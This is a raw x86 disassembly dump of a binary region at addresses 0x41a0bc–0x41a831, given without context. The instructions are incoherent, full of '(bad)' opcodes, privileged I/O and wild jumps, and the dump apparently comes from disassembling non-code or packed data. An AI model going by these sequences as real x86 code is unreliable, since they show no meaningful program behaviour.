  41a0bc:	add    BYTE PTR [edx+0x78],al
  41a0bf:	add    BYTE PTR [ecx],dh
  41a0c1:	sub    al,0x92
  41a0c3:	jnp    0x41a0d3
  41a0c5:	shl    DWORD PTR [edx],cl
  41a0c7:	inc    ebx
  41a0c8:	add    al,0x75
  41a0ca:	je     0x41a07c
  41a0cc:	and    esi,DWORD PTR [ecx+0x6e]
  41a0cf:	shl    BYTE PTR [ebx],0x85
  41a0d2:	cmp    eax,DWORD PTR [edi]
  41a0d4:	je     0x41a12f
  41a0d6:	fistp  QWORD PTR [ebx+0x44]
  41a0d9:	push   ecx
  41a0da:	neg    DWORD PTR [eax]
  41a0dc:	clc    
  41a0dd:	add    ecx,eax
  41a0df:	push   es
  41a0e0:	shr    esi,0x1f
  41a0e3:	loopne 0x41a0f0
  41a0e5:	add    BYTE PTR [eax],ch
  41a0e7:	loopne 0x41a0f8
  41a0e9:	inc    ebp
  41a0ea:	test   al,0x8f
  41a0ec:	and    esi,DWORD PTR [ecx+0x74]
  41a0ef:	shl    BYTE PTR [ebx],0x69
  41a0f2:	sub    DWORD PTR [ecx+0x4290d2fb],0x53
  41a0f9:	(bad)  
  41a0fa:	xchg   edi,eax
  41a0fb:	mov    al,0x4e
  41a0fd:	idiv   dh
  41a0ff:	clc    
  41a100:	inc    DWORD PTR [ecx-0x10]
  41a103:	dec    eax
  41a104:	push   ebp
  41a105:	jne    0x41a0ef
  41a107:	sub    cl,0x26
  41a10a:	add    dh,BYTE PTR [edx-0x49]
  41a10d:	jb     0x41a164
  41a10f:	dec    edi
  41a110:	dec    esp
  41a111:	fwait
  41a112:	add    DWORD PTR [esi+0x7d],edx
  41a115:	lods   eax,DWORD PTR ds:[esi]
  41a116:	xchg   DWORD PTR [ecx],esi
  41a118:	mov    esi,DWORD PTR [ecx-0x46]
  41a11b:	popf   
  41a11c:	add    edi,DWORD PTR [eax-0x7e]
  41a11f:	push   ecx
  41a120:	test   al,0x0
  41a122:	add    BYTE PTR [eax],al
  41a124:	add    BYTE PTR [eax],al
  41a126:	cmc    
  41a127:	addr16 das 
  41a129:	add    al,0x3b
  41a12b:	inc    edi
  41a12c:	cs add al,0xc3
  41a12f:	sub    DWORD PTR [ecx],0x4
  41a132:	bound  eax,QWORD PTR [ecx]
  41a134:	out    0x4b,eax
  41a136:	pop    eax
  41a137:	add    DWORD PTR [esi],edx
  41a139:	mov    DWORD PTR [ebp-0x3fe7526],ecx
  41a13f:	fldcw  WORD PTR [edi+edi*4]
  41a142:	inc    ecx
  41a143:	add    ebp,DWORD PTR [eax+eax*1+0x5c]
  41a147:	push   edx
  41a148:	(bad)
  41a14d:	out    dx,al
  41a14e:	sub    DWORD PTR [ecx],eax
  41a150:	imul   eax,DWORD PTR [ebx-0x57],0x35
  41a154:	fimul  WORD PTR [esi-0xbc4727a]
  41a15a:	adc    DWORD PTR [edi-0x25],esi
  41a15d:	jl     0x41a115
  41a15f:	cli    
  41a160:	jno    0x41a19e
  41a162:	or     eax,0xf808bb79
  41a167:	mov    WORD PTR [esi-0x18840c7e],?
  41a16d:	add    ch,dh
  41a16f:	jbe    0x41a175
  41a171:	test   BYTE PTR [esi+0x1],bl
  41a174:	out    0x8f,eax
  41a176:	and    al,BYTE PTR [ecx]
  41a178:	sbb    al,0xc
  41a17a:	frstor [eax-0xc]
  41a17d:	or     al,cl
  41a17f:	mov    WORD PTR [ecx+ebp*4-0xc5734e3],gs
  41a186:	mov    edx,0xf2ffbe
  41a18b:	add    BYTE PTR [eax],al
  41a18d:	add    BYTE PTR [eax],al
  41a18f:	jbe    0x41a198
  41a191:	add    BYTE PTR [edx-0x230a7a71],0x83
  41a198:	mov    eax,DWORD PTR [edx-0xf]
  41a19b:	sbb    DWORD PTR [ebp-0x8],ecx
  41a19e:	pusha  
  41a19f:	mov    ?,WORD PTR [ecx]
  41a1a1:	rol    BYTE PTR [edx+0x51],0x55
  41a1a5:	mov    DWORD PTR [ebp-0x39],edx
  41a1a8:	dec    edi
  41a1a9:	cmp    DWORD PTR [esi+edi*2-0x41118c00],0xf6e60055
  41a1b4:	jmp    0x106d142e
  41a1b9:	push   ecx
  41a1ba:	adc    DWORD PTR [edx],esi
  41a1bc:	(bad)  
  41a1bd:	cld    
  41a1be:	push   ss
  41a1bf:	rcr    edx,1
  41a1c1:	xor    BYTE PTR [edx],0xff
  41a1c4:	push   es
  41a1c5:	mov    eax,0x8005769e
  41a1ca:	adc    cl,BYTE PTR ds:0x77f16283
  41a1d0:	enter  0xee42,0x77
  41a1d4:	pop    eax
  41a1d5:	jg     0x41a181
  41a1d7:	jns    0x41a1d8
  41a1d9:	cld    
  41a1da:	jmp    0xe1bf7bd4
  41a1df:	stc    
  41a1e0:	stc    
  41a1e1:	cld    
  41a1e2:	into   
  41a1e3:	jb     0x41a262
  41a1e5:	jl     0x41a1d7
  41a1e7:	scas   eax,DWORD PTR es:[edi]
  41a1e8:	std    
  41a1e9:	cld    
  41a1ea:	mov    esi,0xb642c5f2
  41a1ef:	js     0x41a242
  41a1f1:	mov    esi,DWORD PTR [eax+eax*1]
  41a1f4:	add    BYTE PTR [eax],al
  41a1f6:	add    BYTE PTR [eax],al
  41a1f8:	jns    0x41a1e4
  41a1fa:	ins    DWORD PTR es:[edi],dx
  41a1fb:	std    
  41a1fc:	jnp    0x41a1fb
  41a1fe:	sub    DWORD PTR [ecx+0x1cfd3305],0xffffffc5
  41a205:	mov    dl,BYTE PTR [edx-0x7]
  41a208:	jae    0x41a27d
  41a20a:	or     al,0x0
  41a20c:	inc    edi
  41a20d:	shl    esp,0x8b
  41a210:	pop    es
  41a211:	pop    ds
  41a212:	dec    ebp
  41a213:	sti    
  41a214:	sub    eax,DWORD PTR [edi]
  41a216:	xchg   eax,esi
  41a218:	sbb    eax,0x93007a08
  41a21d:	xor    DWORD PTR [eax+0x1d],0xc
  41a221:	mov    ebx,edi
  41a223:	add    BYTE PTR [eax+0x2475fb52],dh
  41a229:	push   ds
  41a22a:	mov    esp,0x87073b14
  41a22f:	(bad)  
  41a230:	fisubr DWORD PTR [ebp+eax*8-0x41fcb33e]
  41a237:	jp     0x41a295
  41a239:	add    BYTE PTR [ebp-0x15],bh
  41a23c:	test   DWORD PTR [ecx+0x7b7175f5],eax
  41a242:	inc    ecx
  41a243:	clc    
  41a244:	xlat   BYTE PTR ds:[ebx]
  41a245:	mov    ecx,0xd45d8904
  41a24a:	mov    esp,0x44796feb
  41a24f:	and    al,0x1c
  41a251:	mov    bl,0xfb
  41a253:	je     0x41a295
  41a255:	repz sti 
  41a257:	je     0x41a289
  41a259:	repz sti 
  41a25b:	je     0x41a25d
  41a25d:	add    BYTE PTR [eax],al
  41a25f:	add    BYTE PTR [eax],al
  41a261:	jo     0x41a259
  41a263:	in     al,0x47
  41a265:	cmp    ecx,DWORD PTR [eax]
  41a267:	sti    
  41a268:	ret    
  41a269:	mov    dh,0xfa
  41a26b:	fs clc 
  41a26d:	scas   al,BYTE PTR es:[edi]
  41a26e:	ret    
  41a26f:	cld    
  41a270:	out    0xbc,eax
  41a272:	sbb    ch,bh
  41a274:	dec    DWORD PTR [edi+0x2b00f8a2]
  41a27a:	xchg   edx,eax
  41a27b:	or     bh,bh
  41a27d:	mov    eax,ds:0xc415fbfe
  41a282:	cmc    
  41a283:	cmp    al,0x0
  41a285:	gs ret 0xebe0
  41a289:	jne    0x41a272
  41a28b:	sar    DWORD PTR [edi+0x6379ac35],1
  41a291:	int    0xaf
  41a293:	mov    edi,0x67fbbe3
  41a298:	std    
  41a299:	mul    BYTE PTR ds:0x25fefd08
  41a29f:	and    al,ch
  41a2a1:	mov    eax,ds:0xb7000452
  41a2a6:	lock add BYTE PTR [edx-0x7f],ch
  41a2aa:	rcr    DWORD PTR [eax],0x72
  41a2ad:	ss jmp 0xe9d154cb
  41a2b3:	add    BYTE PTR [ecx-0x2fec2f0],al
  41a2b9:	call   0x7db4a8a5
  41a2be:	sub    al,0xf0
  41a2c0:	cmp    eax,DWORD PTR [ebx+ebp*4+0x8700]
  41a2c7:	add    BYTE PTR [eax],al
  41a2c9:	add    BYTE PTR [eax+0x514b8207],dh
  41a2cf:	adc    eax,0x2b860b1a
  41a2d4:	rol    eax,0xee
  41a2d7:	mov    ds,WORD PTR [eax]
  41a2d9:	sub    DWORD PTR ds:0x314378fd,0x74ea3f04
  41a2e3:	jmp    0x41a323
  41a2e5:	or     BYTE PTR [ebp+0x3e],dh
  41a2e8:	ja     0x41a2d6
  41a2ea:	test   bh,0xf3
  41a2ed:	lds    edi,FWORD PTR [eax+0x358300d5]
  41a2f3:	pop    eax
  41a2f4:	adc    DWORD PTR [eax-0x55],0x1c
  41a2f8:	jne    0x41a371
  41a2fa:	ins    DWORD PTR es:[edi],dx
  41a2fb:	jb     0x41a2ba
  41a2fd:	repz (bad) 
  41a2ff:	in     al,dx
  41a300:	jns    0x41a345
  41a302:	in     eax,0x66
  41a304:	inc    esp
  41a305:	je     0x41a35e
  41a307:	add    dh,BYTE PTR [edx-0x73]
  41a30a:	loop   0x41a319
  41a30c:	push   ebp
  41a30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a30e:	jbe    0x41a299
  41a310:	lods   al,BYTE PTR ds:[esi]
  41a311:	ds ss std 
  41a314:	out    0x1b,al
  41a316:	je     0x41a359
  41a318:	out    0x3,eax
  41a31a:	hlt    
  41a31b:	cli    
  41a31c:	fcom   QWORD PTR [ecx+0xc2b8f39]
  41a322:	inc    ebp
  41a323:	push   0x54809a27
  41a328:	rol    DWORD PTR [eax+ebx*4],1
  41a32b:	pop    ss
  41a32c:	scas   eax,DWORD PTR es:[edi]
  41a32d:	repnz add BYTE PTR [eax],al
  41a330:	add    BYTE PTR [eax],al
  41a332:	add    BYTE PTR [edx+0x2],dl
  41a335:	ins    BYTE PTR es:[edi],dx
  41a336:	inc    esp
  41a337:	add    DWORD PTR [eax],esi
  41a339:	rol    DWORD PTR [ebx],0xf4
  41a33c:	rol    DWORD PTR [ecx-0x4f],0x79
  41a340:	ja     0x41a379
  41a342:	scas   al,BYTE PTR es:[edi]
  41a343:	fdiv   st(5),st
  41a345:	xor    eax,0xa710beef
  41a34a:	add    esi,esi
  41a34c:	rcr    DWORD PTR [edx+0x1e4730ff],0x3
  41a353:	inc    BYTE PTR [esi+0xf]
  41a356:	mov    ah,0x49
  41a358:	ja     0x41a369
  41a35a:	call   0x1738:0x4915460
  41a361:	scas   eax,DWORD PTR es:[edi]
  41a362:	bnd jb 0x41a367
  41a365:	xchg   DWORD PTR [bx+di],ebp
  41a368:	add    dh,BYTE PTR [edi+edi*8+0x38]
  41a36c:	inc    edi
  41a36d:	in     eax,0x3
  41a36f:	hlt    
  41a370:	(bad)  
  41a371:	test   BYTE PTR [esi+edi*4],0xf6
  41a375:	pop    ebx
  41a376:	ja     0x41a320
  41a378:	pop    esp
  41a379:	xor    bh,BYTE PTR [edx-0x4a]
  41a37c:	cld    
  41a37d:	scas   eax,DWORD PTR es:[edi]
  41a37e:	inc    eax
  41a37f:	mov    ds:0xfc097255,eax
  41a384:	bnd jmp DWORD PTR [ecx-0x1d]
  41a388:	push   0x57792acb
  41a38d:	push   esi
  41a38e:	xchg   ecx,eax
  41a38f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a390:	(bad)  
  41a391:	std    
  41a392:	sahf   
  41a393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a394:	ret    
  41a395:	ss pop eax
  41a397:	add    BYTE PTR [eax],al
  41a399:	add    BYTE PTR [eax],al
  41a39b:	add    dh,bh
  41a39d:	mov    DWORD PTR [eax-0x17],0x408706f3
  41a3a4:	out    dx,al
  41a3a5:	mov    DWORD PTR [eax-0x17],0x6a03bcf5
  41a3ac:	jg     0x41a3c8
  41a3ae:	jb     0x41a333
  41a3b0:	fstp   DWORD PTR [esi-0x3f]
  41a3b3:	mov    esp,0xba4eee1d
  41a3b8:	loopne 0x41a343
  41a3ba:	jb     0x41a3a1
  41a3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bd:	fnstenv [eax]
  41a3bf:	and    BYTE PTR [ebp-0x21e8a0f],ch
  41a3c5:	inc    eax
  41a3c6:	or     BYTE PTR [edx-0x4a],ch
  41a3c9:	push   cs
  41a3ca:	aaa    
  41a3cb:	xchg   ecx,eax
  41a3cc:	jp     0x41a444
  41a3ce:	imul   esp,DWORD PTR [eax+0xe],0xfffffff8
  41a3d2:	xchg   DWORD PTR [ecx],eax
  41a3d4:	cmp    DWORD PTR ss:[edi+0x71ce3df9],0x7
  41a3dc:	int    0xc4
  41a3de:	push   0x6a575529
  41a3e3:	test   eax,0xe92cfbde
  41a3e8:	jbe    0x41a43c
  41a3ea:	push   ecx
  41a3eb:	xor    DWORD PTR [ecx-0x3],0x12
  41a3ef:	xchg   ebp,eax
  41a3f0:	and    al,0x3c
  41a3f2:	add    BYTE PTR [edx+0x19],dh
  41a3f5:	cmp    edi,ecx
  41a3f7:	push   ebp
  41a3f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3f9:	sbb    DWORD PTR [edx-0x2b],0x4a
  41a3fd:	icebp  
  41a3fe:	jne    0x41a419
  41a400:	add    BYTE PTR [eax],al
  41a402:	add    BYTE PTR [eax],al
  41a404:	add    dl,dh
  41a406:	jo     0x41a410
  41a408:	add    BYTE PTR [edi-0x6d74fb38],cl
  41a40e:	(bad)  
  41a40f:	fs stos BYTE PTR es:[edi],al
  41a411:	pop    ebx
  41a412:	inc    ebp
  41a413:	add    BYTE PTR [edi+0x13],dl
  41a416:	jns    0x41a414
  41a418:	call   0x41e8b7
  41a41d:	pop    ecx
  41a41e:	(bad)  
  41a41f:	jo     0x41a436
  41a421:	push   ebp
  41a422:	inc    eax
  41a423:	push   edi
  41a425:	repz dec ecx
  41a427:	cld    
  41a428:	mov    BYTE PTR [edx+0x3045870a],cl
  41a42e:	add    edx,0x10
  41a431:	out    0x4a,eax
  41a433:	or     al,0x72
  41a435:	or     cl,BYTE PTR [ecx+eax*2-0x3b6aaf4]
  41a43c:	jne    0x41a3c2
  41a43e:	scas   eax,DWORD PTR es:[edi]
  41a43f:	std    
  41a440:	jmp    0x8c97:0xebc03592
  41a447:	dec    ecx
  41a448:	or     BYTE PTR [ebx+ebp*4],ah
  41a44b:	cli    
  41a44c:	push   DWORD PTR [ebx+0x25fc034]
  41a452:	pop    esp
  41a453:	vandps xmm7,xmm7,xmm7
  41a457:	pushf  
  41a458:	jl     0x41a3fb
  41a45a:	inc    ebx
  41a45b:	add    BYTE PTR [ebp-0x38f38564],al
  41a461:	pop    ecx
  41a462:	ret    
  41a463:	mov    edi,0xa9fc4c43
  41a468:	inc    edx
  41a469:	add    BYTE PTR [eax],al
  41a46b:	add    BYTE PTR [eax],al
  41a46d:	add    BYTE PTR [esp+ebp*8+0xb],cl
  41a471:	mov    eax,ds:0x3fd1f4
  41a476:	pop    ebx
  41a477:	or     esp,eax
  41a479:	ret    
  41a47a:	iret   
  41a47b:	inc    BYTE PTR [ebx-0x53]
  41a47e:	dec    esi
  41a47f:	push   es
  41a480:	lahf   
  41a481:	rcr    bh,0x43
  41a484:	add    BYTE PTR [ecx+0x40d06175],ah
  41a48a:	jne    0x41a414
  41a48c:	rol    al,1
  41a48e:	mov    dh,0xe9
  41a490:	mov    ds:0x4298873,eax
  41a495:	mov    eax,ds:0x45a7d5
  41a49a:	adc    al,0x51
  41a49c:	sbb    BYTE PTR [eax+0x75],al
  41a49f:	dec    eax
  41a4a0:	icebp  
  41a4a1:	shl    BYTE PTR [esi],0xe9
  41a4a4:	mov    ds:0x4296087,eax
  41a4a9:	mov    eax,ds:0x45a575
  41a4ae:	adc    al,0x75
  41a4b0:	sbb    BYTE PTR [eax+0x75],al
  41a4b3:	dec    eax
  41a4b4:	adc    esp,eax
  41a4b6:	ss jmp 0x29ca345f
  41a4bc:	add    al,0xa1
  41a4be:	push   ebp
  41a4bf:	sub    eax,0x98d40046
  41a4c4:	pop    ss
  41a4c5:	inc    eax
  41a4c6:	jne    0x41a450
  41a4c8:	xor    ah,al
  41a4ca:	ss jmp 0xa9a22073
  41a4d0:	add    BYTE PTR [ecx+0x0],ah
  41a4d6:	add    BYTE PTR [ebp+0x1400461f],dh
  41a4dc:	ins    BYTE PTR es:[edi],dx
  41a4dd:	sbb    BYTE PTR [eax+0x75],al
  41a4e0:	mov    WORD PTR [eax-0x3c],ss
  41a4e3:	mov    dh,0xeb
  41a4e5:	mov    ds:0xab68b3,eax
  41a4ea:	mov    eax,ds:0x4627d5
  41a4ef:	adc    al,0x78
  41a4f1:	sbb    BYTE PTR [eax+0x75],al
  41a4f4:	dec    esp
  41a4f5:	jno    0x41a4bb
  41a4f7:	mov    dh,0xeb
  41a4f9:	mov    ds:0xab8083,eax
  41a4fe:	mov    eax,ds:0x461ff5
  41a503:	aam    0x2
  41a505:	pop    edi
  41a506:	pop    ss
  41a507:	mov    ch,0x2
  41a509:	mov    dl,BYTE PTR [esi+esi*1+0x6aa2e746]
  41a510:	adc    BYTE PTR [edi],ah
  41a512:	add    al,0xd4
  41a514:	mov    ds:0xa37545aa,al
  41a519:	ficomp DWORD PTR [ecx]
  41a51b:	xor    eax,0xb6b48a02
  41a520:	inc    ebp
  41a521:	out    0xa2,eax
  41a523:	retf   0x270f
  41a526:	add    al,0x14
  41a528:	ret    
  41a529:	mov    ds:0x52a37545,al
  41a52e:	pop    ss
  41a52f:	xor    eax,0xb6d44a02
  41a534:	inc    ebp
  41a535:	out    0xa2,eax
  41a537:	sahf   
  41a538:	(bad)  
  41a53a:	add    al,0x0
  41a53c:	add    BYTE PTR [eax],al
  41a53e:	add    BYTE PTR [eax],al
  41a540:	aam    0xe2
  41a542:	stos   BYTE PTR es:[edi],al
  41a543:	inc    ebp
  41a544:	jne    0x41a4e9
  41a546:	jp     0x41a55d
  41a548:	xor    eax,0xb6f48a02
  41a54d:	inc    ebp
  41a54e:	out    0xa2,eax
  41a550:	mov    esi,0xd403a70e
  41a555:	add    ah,BYTE PTR [eax*2+0x1842a375]
  41a55c:	mov    ch,0x2
  41a55e:	mov    dl,BYTE PTR [esi+esi*1]
  41a561:	inc    ebp
  41a562:	out    0xa2,eax
  41a564:	ss push cs
  41a566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a567:	add    edx,DWORD PTR [edx+eiz*1]
  41a56a:	sub    al,0x45
  41a56c:	jne    0x41a511
  41a56e:	add    dl,BYTE PTR ds:0x344a02b5
  41a574:	ss inc ebp
  41a576:	out    0xa2,eax
  41a578:	es push cs
  41a57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a57b:	add    edx,esp
  41a57d:	inc    ecx
  41a57e:	and    al,0x45
  41a580:	jne    0x41a525
  41a582:	(bad)  
  41a583:	call   0x4a41e813
  41a588:	rol    ebp,0x40
  41a58b:	jmp    0x29528667
  41a590:	jno    0x41a535
  41a592:	pop    edi
  41a593:	lods   al,BYTE PTR ds:[esi]
  41a594:	mov    ecx,0x62a19f02
  41a599:	inc    edx
  41a59a:	add    BYTE PTR [edx-0x16bf3a9a],cl
  41a5a0:	pop    ss
  41a5a1:	fst    QWORD PTR [ebx]
  41a5a3:	sub    DWORD PTR [eax],eax
  41a5a5:	add    BYTE PTR [eax],al
  41a5a7:	add    BYTE PTR [eax],al
  41a5a9:	jns    0x41a54e
  41a5ab:	jg     0x41a551
  41a5ad:	xor    DWORD PTR [edx],eax
  41a5af:	lahf   
  41a5b0:	mov    eax,ds:0x4a00426a
  41a5b5:	out    0xc3,al
  41a5b7:	inc    eax
  41a5b8:	jmp    0x29558ed4
  41a5bd:	jno    0x41a562
  41a5bf:	lahf   
  41a5c0:	lods   al,BYTE PTR ds:[esi]
  41a5c1:	cmp    DWORD PTR [edx],eax
  41a5c3:	lahf   
  41a5c4:	test   DWORD PTR [edx-0x19b5ffbe],eax
  41a5ca:	ret    
  41a5cb:	inc    eax
  41a5cc:	jmp    0xa954a6a8
  41a5d1:	jbe    0x41a576
  41a5d3:	mov    edi,0x9f023124
  41a5d8:	push   ebp
  41a5d9:	imul   eax,DWORD PTR [edx+0x0],0x40c3a68a
  41a5e0:	jmp    0xa95271fc
  41a5e5:	jbe    0x41a588
  41a5e7:	fild   QWORD PTR [ecx+edi*4]
  41a5ea:	add    bl,BYTE PTR [edi+0x4282a1]
  41a5f0:	dec    edx
  41a5f1:	inc    esi
  41a5f2:	lds    eax,FWORD PTR [eax-0x17]
  41a5f5:	pop    ss
  41a5f6:	sub    BYTE PTR [ebx],dl
  41a5f8:	test   eax,0x26ffa176
  41a5fd:	mov    cl,0x2
  41a5ff:	lahf   
  41a600:	add    al,dh
  41a602:	cmovo  eax,DWORD PTR [eax]
  41a605:	mov    edi,0xc43c613
  41a60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a60b:	cmp    BYTE PTR ds:0x0,dl
  41a611:	add    ah,cl
  41a613:	add    ebx,DWORD PTR [edi+0x43e220]
  41a619:	mov    eax,ds:0x401a4c
  41a61e:	out    dx,eax
  41a61f:	mov    BYTE PTR cs:[ebx+0xc],0x9f
  41a624:	or     al,0x15
  41a626:	pushf  
  41a627:	(bad)  
  41a628:	sahf   
  41a629:	inc    eax
  41a62a:	adc    al,BYTE PTR [eax+eax*1-0x5f]
  41a62e:	nop
  41a62f:	sbb    al,BYTE PTR [eax+0x0]
  41a632:	out    dx,eax
  41a633:	dec    esi
  41a634:	mov    BYTE PTR [ebx-0x24],0x9e
  41a638:	push   esp
  41a639:	adc    al,0x9c
  41a63b:	(bad)  
  41a63c:	sahf   
  41a63d:	pusha  
  41a63e:	adc    al,BYTE PTR [eax+eax*1-0x5f]
  41a642:	mov    ah,0xf
  41a644:	inc    eax
  41a645:	add    BYTE PTR [edi],bh
  41a647:	outs   dx,BYTE PTR ds:[esi]
  41a648:	mov    BYTE PTR [ebx-0x64],0x9e
  41a64c:	test   al,0x14
  41a64e:	dec    esp
  41a64f:	(bad)  
  41a650:	sahf   
  41a651:	adc    dl,0x43
  41a654:	add    BYTE PTR [ecx+0x401a58],ah
  41a65a:	dec    DWORD PTR [esi-0x6173bc3e]
  41a660:	dec    eax
  41a661:	adc    al,0xcc
  41a663:	add    ebx,DWORD PTR [edi+0x43a2a0]
  41a669:	mov    eax,ds:0x401a78
  41a66e:	out    dx,eax
  41a66f:	lods   eax,DWORD PTR ds:[esi]
  41a670:	ret    0x4c43
  41a673:	sahf   
  41a674:	cmp    al,0x14
  41a676:	add    BYTE PTR [eax],al
  41a678:	add    BYTE PTR [eax],al
  41a67a:	add    BYTE PTR [ebx+eax*1],bl
  41a67d:	lahf   
  41a67e:	rcl    BYTE PTR [edx+0x75a10043],0xb5
  41a685:	adc    al,0x40
  41a687:	jne    0x41a6d5
  41a689:	aam    0xc5
  41a68b:	mov    dh,0xe9
  41a68d:	mov    ds:0xa98033,eax
  41a692:	mov    eax,ds:0x412715
  41a697:	aam    0x44
  41a699:	sbb    BYTE PTR [eax+0x75],al
  41a69c:	mov    eax,?
  41a69e:	lds    esi,FWORD PTR [esi+0x692fa3e9]
  41a6a4:	sub    DWORD PTR [ecx+eiz*4],eax
  41a6a7:	jne    0x41a649
  41a6a9:	inc    ecx
  41a6aa:	add    BYTE PTR [ecx+ecx*4],dl
  41a6ad:	adc    al,0x40
  41a6af:	jne    0x41a63d
  41a6b1:	adc    ch,al
  41a6b3:	ss jmp 0x29c2de5c
  41a6b9:	add    al,0xa1
  41a6bb:	xchg   ebp,eax
  41a6bc:	test   al,0x41
  41a6be:	add    BYTE PTR [ecx+ecx*2],dl
  41a6c1:	adc    DWORD PTR [eax+0x75],eax
  41a6c4:	add    edi,DWORD PTR [eax+ebp*2]
  41a6c7:	mov    ch,0xab
  41a6c9:	inc    ecx
  41a6ca:	add    dh,dl
  41a6cc:	mov    eax,0x917540c5
  41a6d1:	add    eax,0xc26fa2fb
  41a6d6:	push   eax
  41a6d7:	inc    ebx
  41a6d8:	fs cmp al,al
  41a6db:	addr16 test eax,0x6800
  41a6e1:	add    BYTE PTR [eax],al
  41a6e3:	add    BYTE PTR [ebp-0x30],al
  41a6e6:	inc    eax
  41a6e7:	add    BYTE PTR [edx],ch
  41a6e9:	push   eax
  41a6ea:	shl    DWORD PTR [edi+0x31],cl
  41a6ed:	rol    BYTE PTR [eax+0x0],1
  41a6f0:	retf   0x4088
  41a6f3:	lds    esi,FWORD PTR [esi-0x322a0215]
  41a6f9:	fwait
  41a6fa:	jne    0x41a73c
  41a6fc:	jne    0x41a68a
  41a6fe:	mov    eax,ds:0xaa033a4f
  41a703:	add    ecx,DWORD PTR [eax-0x33]
  41a706:	mov    ds,WORD PTR [ebx-0x38]
  41a709:	inc    edx
  41a70a:	out    0x56,eax
  41a70c:	adc    al,0x63
  41a70e:	es inc edx
  41a710:	jne    0x41a707
  41a712:	sbb    al,0x6b
  41a714:	xchg   ebp,eax
  41a715:	ins    DWORD PTR es:[edi],dx
  41a716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a717:	add    ecx,eax
  41a719:	mov    eax,ds:0x2b5c676
  41a71e:	out    dx,al
  41a71f:	aam    0x9c
  41a721:	dec    DWORD PTR [esi+0x44]
  41a724:	xor    BYTE PTR [edx-0x19],al
  41a727:	mov    al,ds:0x429bd82
  41a72c:	or     eax,0xf1fdcab4
  41a731:	mov    BYTE PTR [esi+0x46ecd88],bl
  41a737:	std    
  41a738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a739:	mov    ch,BYTE PTR [ebp-0x5a768abf]
  41a73f:	std    
  41a740:	xchg   DWORD PTR [edx-0x52],edi
  41a743:	inc    ecx
  41a744:	jne    0x41a73b
  41a746:	shr    DWORD PTR [ebx+0x0],cl
  41a749:	add    BYTE PTR [eax],al
  41a74b:	add    BYTE PTR [eax],al
  41a74d:	mov    eax,0x87fce741
  41a752:	pop    edx
  41a753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a754:	inc    ecx
  41a755:	jne    0x41a74c
  41a757:	mov    ebx,0xe741b04b
  41a75c:	jmp    0x41a7dd
  41a75e:	cmp    BYTE PTR [esi-0x3],dh
  41a761:	cmp    BYTE PTR [eax+0x4cb459a9],cl
  41a767:	jb     0x41a7e1
  41a769:	push   ecx
  41a76a:	or     dh,BYTE PTR [esi-0x49768378]
  41a770:	paddsb mm1,QWORD PTR [esi]
  41a773:	cdq    
  41a774:	mov    edx,esp
  41a776:	push   0xffffffea
  41a778:	icebp  
  41a779:	std    
  41a77a:	push   ecx
  41a77b:	retf   
  41a77c:	sub    BYTE PTR [edx],dh
  41a77e:	cmp    DWORD PTR [eax],eax
  41a780:	xor    ebx,ebx
  41a782:	(bad)  
  41a783:	xor    BYTE PTR [ecx],ch
  41a785:	pop    esp
  41a786:	sub    esi,esi
  41a788:	lods   eax,DWORD PTR ds:[esi]
  41a789:	xchg   edx,eax
  41a78a:	adc    bh,bh
  41a78c:	mov    ecx,0x168330ca
  41a791:	mov    ebx,0x66a98918
  41a796:	sub    ebp,edi
  41a798:	mul    al
  41a79a:	or     ecx,DWORD PTR ds:0x8a047d37
  41a7a0:	aad    0x75
  41a7a2:	inc    edi
  41a7a3:	aas    
  41a7a4:	mov    cl,0x72
  41a7a6:	add    BYTE PTR [ebx+0x7],dh
  41a7a9:	repnz cmc 
  41a7ab:	jl     0x41a77f
  41a7ad:	inc    ebp
  41a7ae:	ret    0x323f
  41a7b1:	add    BYTE PTR [eax],al
  41a7b3:	add    BYTE PTR [eax],al
  41a7b5:	add    BYTE PTR [eax+0x76e1c254],bl
  41a7bb:	mov    BYTE PTR [esi],cl
  41a7bd:	jae    0x41a82f
  41a7bf:	inc    edi
  41a7c0:	aas    
  41a7c1:	daa    
  41a7c2:	lahf   
  41a7c3:	shl    BYTE PTR [edx-0x11],0xf3
  41a7c7:	cmc    
  41a7c8:	jl     0x41a782
  41a7ca:	fstp   st(6)
  41a7cc:	xor    BYTE PTR [ecx+0x7252dfdd],ch
  41a7d2:	shl    BYTE PTR [ebx-0x14],cl
  41a7d5:	std    
  41a7d6:	ja     0x41a7da
  41a7d8:	add    BYTE PTR [edx],bh
  41a7da:	dec    ebx
  41a7db:	mov    esi,DWORD PTR [edx-0x23]
  41a7de:	inc    ecx
  41a7df:	mov    edi,ecx
  41a7e1:	jb     0x41a7a2
  41a7e3:	fld    TBYTE PTR [ebx]
  41a7e5:	(bad)  
  41a7e6:	jbe    0x41a7ea
  41a7e8:	mov    DWORD PTR [ebx*2+0x79f1463b],esp
  41a7ef:	xor    DWORD PTR [ebx],0xfffffffe
  41a7f2:	jbe    0x41a7f6
  41a7f4:	imul   BYTE PTR [esi+edx*2-0x715b7700]
  41a7fb:	jnp    0x41a83f
  41a7fd:	add    ah,al
  41a7ff:	imul   ecx,DWORD PTR [ebx],0xffffff8b
  41a802:	sbb    DWORD PTR [eax*4+0x41849445],edx
  41a809:	enter  0x54d5,0xcc
  41a80d:	mov    DWORD PTR [ecx],ebx
  41a80f:	adc    al,0x8a
  41a811:	bswap  edi
  41a813:	pop    esp
  41a814:	lock add bh,cl
  41a817:	pop    esp
  41a818:	in     al,dx
  41a819:	add    BYTE PTR [eax],al
  41a81b:	add    BYTE PTR [eax],al
  41a81d:	add    BYTE PTR [eax],al
  41a81f:	push   ebx
  41a820:	scas   al,BYTE PTR es:[edi]
  41a821:	mov    ebp,0x7ff3d989
  41a826:	clc    
  41a827:	stos   BYTE PTR es:[edi],al
  41a828:	push   es
  41a829:	sub    DWORD PTR [ebp+0xf000035],0x4a
  41a830:	(bad)  
  41a831:	out    dx,eax
